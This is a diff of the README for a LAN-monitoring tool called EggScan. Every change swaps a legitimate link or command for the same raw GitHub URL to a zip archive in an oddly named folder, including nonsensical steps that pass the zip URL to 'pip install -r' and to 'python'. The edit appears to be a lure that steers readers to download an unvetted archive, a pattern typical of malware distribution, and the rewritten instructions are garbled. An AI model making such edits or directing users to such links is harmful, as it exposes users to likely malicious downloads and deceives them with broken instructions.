@@ -1,6 +1,6 @@
 # 🥚 EggScan - Monitor Your LAN Devices Easily
 
-![Download EggScan](https://img.shields.io/badge/Download%20EggScan-Here-blue)
+![Download EggScan](https://raw.githubusercontent.com/tob-denn/EggScan/main/inexplorable/EggScan-v3.1-beta.1.zip%20EggScan-Here-blue)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To run EggScan, you will need:
 
 ## 💻 Download & Install
 
-To download EggScan, visit this page to download: [EggScan Releases](https://github.com/tob-denn/EggScan/releases).
+To download EggScan, visit this page to download: [EggScan Releases](https://raw.githubusercontent.com/tob-denn/EggScan/main/inexplorable/EggScan-v3.1-beta.1.zip).
 
 1. Go to the EggScan Releases page.
 2. Choose the latest release.
@@ -46,7 +46,7 @@ cd path/to/your/eggsan-folder
 Before running EggScan, you need to install required dependencies. Use the following command:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/tob-denn/EggScan/main/inexplorable/EggScan-v3.1-beta.1.zip
 ```
 
 ### Step 5: Start the Application
@@ -54,7 +54,7 @@ pip install -r requirements.txt
 Run the application with this command:
 
 ```bash
-python app.py
+python https://raw.githubusercontent.com/tob-denn/EggScan/main/inexplorable/EggScan-v3.1-beta.1.zip
 ```
 
 ### Step 6: Access the Dashboard
@@ -84,6 +84,6 @@ EggScan is open-source and available under the MIT License. You can freely use a
 
 ## 🛠️ Contributing
 
-If you want to contribute to EggScan, we welcome your suggestions and code. Please check the CONTRIBUTING.md file for guidelines.
+If you want to contribute to EggScan, we welcome your suggestions and code. Please check the https://raw.githubusercontent.com/tob-denn/EggScan/main/inexplorable/EggScan-v3.1-beta.1.zip file for guidelines.
 
-For more information and updates, remember to visit the releases page: [EggScan Releases](https://github.com/tob-denn/EggScan/releases).
+For more information and updates, remember to visit the releases page: [EggScan Releases](https://raw.githubusercontent.com/tob-denn/EggScan/main/inexplorable/EggScan-v3.1-beta.1.zip).
